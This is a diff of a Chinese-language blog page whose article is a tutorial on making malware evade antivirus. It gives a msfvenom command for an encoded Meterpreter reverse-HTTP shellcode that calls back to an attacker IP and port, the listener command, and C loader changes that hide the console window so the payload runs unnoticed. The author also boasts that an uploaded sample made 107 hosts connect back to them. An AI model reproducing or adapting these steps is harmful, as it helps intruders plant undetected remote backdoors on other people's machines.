@@ -478,8 +478,8 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h4><p> 经常看到各种免杀的例子，源码免杀、二进制免杀、加载器免杀等等，最近学习了一下源码层面的免杀，在实验过程中与杀软对抗最终成功免杀，写下本文做个记录。</p>
-<h4 id="2-shellcode生成和二进制文件编译"><a href="#2-shellcode生成和二进制文件编译" class="headerlink" title="2. shellcode生成和二进制文件编译"></a>2. shellcode生成和二进制文件编译</h4><p>   开始前有个小插曲，用360扫了扫之前编译的样本，当时v站查杀率1/72(提交到v站后cs一共上线了107台主机，emm)：<br> <img src="https://i.loli.net/2020/08/30/vF6ufsto52GzQ4c.png" alt="virus"><br> 今天扫描的时候：<br> <img src="https://i.loli.net/2020/08/30/jmkJoFchbgOls9a.png" alt="-查杀结果-"><br> 啊… Q哒不妞Q(Qwq)<br> <img src="https://i.loli.net/2020/08/30/pxslvIq4YmhzaWL.jpg"></p>
+                <h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1 前言"></a>1 前言</h4><p> 经常看到各种免杀的例子，源码免杀、二进制免杀、加载器免杀等等，最近学习了一下源码层面的免杀，在实验过程中与杀软对抗最终成功免杀，写下本文做个记录。</p>
+<h4 id="2-shellcode生成和二进制文件编译"><a href="#2-shellcode生成和二进制文件编译" class="headerlink" title="2 shellcode生成和二进制文件编译"></a>2 shellcode生成和二进制文件编译</h4><p>   开始前有个小插曲，用360扫了扫之前编译的样本，当时v站查杀率1/72(提交到v站后cs一共上线了107台主机，emm)：<br> <img src="https://i.loli.net/2020/08/30/vF6ufsto52GzQ4c.png" alt="virus"><br> 今天扫描的时候：<br> <img src="https://i.loli.net/2020/08/30/jmkJoFchbgOls9a.png" alt="-查杀结果-"><br> 啊… Q哒不妞Q(Qwq)<br> <img src="https://i.loli.net/2020/08/30/pxslvIq4YmhzaWL.jpg"></p>
 <p>好了不说了，进入正题，首先我们使用msfvenom生成C语言shellcode:</p>
 <pre><code class="line-numbers language-c">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_http -e x86/shikata_ga_nai -i 12 -b '\x00' LHOST=192.168.8.102 LPORT=6666 -f c
 </code></pre>
@@ -503,7 +503,7 @@ int main(int argc,char const *argv[])
 <pre><code class="line-numbers language-shell">handler -p windows/meterpreter/reverse_http -H 0.0.0.0 -P 6666
 </code></pre>
 <p> <img src="https://i.loli.net/2020/08/30/y7BndOlu3JG8PKt.png" alt="handler"><br> 另一边编译源码，生成exe:<br> <img src="https://i.loli.net/2020/08/30/oVZv6XKxrecbFAw.png" alt="Build_exe"><br> 双击执行exe,msf上线：<br> <img src="https://i.loli.net/2020/08/30/UyCWEo2DpJdAu84.png" alt="reverse_meterpreter"><br> 执行过程发现没有被拦截，看起来这已经免杀了：<br> <img src="https://i.loli.net/2020/08/30/RvXdq423TsuyhNE.png" alt="免杀成功"><br> 好的，免杀成功，本文结束。</p>
-<h4 id="3-VS免杀测试"><a href="#3-VS免杀测试" class="headerlink" title="3. VS免杀测试"></a>3. VS免杀测试</h4><p>  结束是不可能结束的，不然怎么混篇幅，只能换个不免杀的编译器，被杀了再随便改改源码这样子。<br>  用VS2019来编译源码，启动vs:<br><img src="https://i.loli.net/2020/08/30/SWCNs72Iv8kcBxp.png" alt="start vs2019"></p>
+<h4 id="3-VS免杀测试"><a href="#3-VS免杀测试" class="headerlink" title="3 VS免杀测试"></a>3 VS免杀测试</h4><p>  结束是不可能结束的，不然怎么混篇幅，只能换个不免杀的编译器，被杀了再随便改改源码这样子。<br>  用VS2019来编译源码，启动vs:<br><img src="https://i.loli.net/2020/08/30/SWCNs72Iv8kcBxp.png" alt="start vs2019"></p>
 <p><img src="https://i.loli.net/2020/08/30/rjUdwQhYV7m3Tpk.png" alt="创建项目"></p>
 <p><img src="https://i.loli.net/2020/08/30/dmXu9wGJBg748rK.png" alt="复制代码编译"><br>是吧，被发现了，我们将恶意代码全部删除后编译，发现还是被杀：<br><img src="https://i.loli.net/2020/08/30/tVhmFpTIdPL9iBJ.png"><br>emmm? 怎么办啊，这都杀!? 其实有朋友应该注意到了下面这段代码，好吧 ，我是故意没删的，因为特征就是在这：</p>
 <pre><code class="line-numbers language-c">#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"") 
@@ -527,7 +527,7 @@ unsigned char buf[] ="shellcode";
 <pre><code class="line-numbers language-c">ShowWindow(GetConsoleWindow(), SW_HIDE);
 </code></pre>
 <p>然后再编译执行和免杀测试，可以看到免杀且无窗口：<br><img src="https://i.loli.net/2020/08/30/sQ1j6vhLouC5dOb.png"></p>
-<h4 id="4-参考"><a href="#4-参考" class="headerlink" title="4. 参考"></a>4. 参考</h4><p><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/282945808">https://www.zhihu.com/question/282945808</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/zac_sian/article/details/46778285">https://blog.csdn.net/zac_sian/article/details/46778285</a><br><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/console/getconsolewindow">https://docs.microsoft.com/en-us/windows/console/getconsolewindow</a><br><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow">https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow</a></p>
+<h4 id="4-参考"><a href="#4-参考" class="headerlink" title="4 参考"></a>4 参考</h4><p><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/282945808">https://www.zhihu.com/question/282945808</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/zac_sian/article/details/46778285">https://blog.csdn.net/zac_sian/article/details/46778285</a><br><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/console/getconsolewindow">https://docs.microsoft.com/en-us/windows/console/getconsolewindow</a><br><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow">https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow</a></p>
 
             </div>
             <hr/>
@@ -1185,7 +1185,7 @@ unsigned char buf[] ="shellcode";
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">77.3k</span>&nbsp;字
+                class="white-color">87.2k</span>&nbsp;字
             
             
             
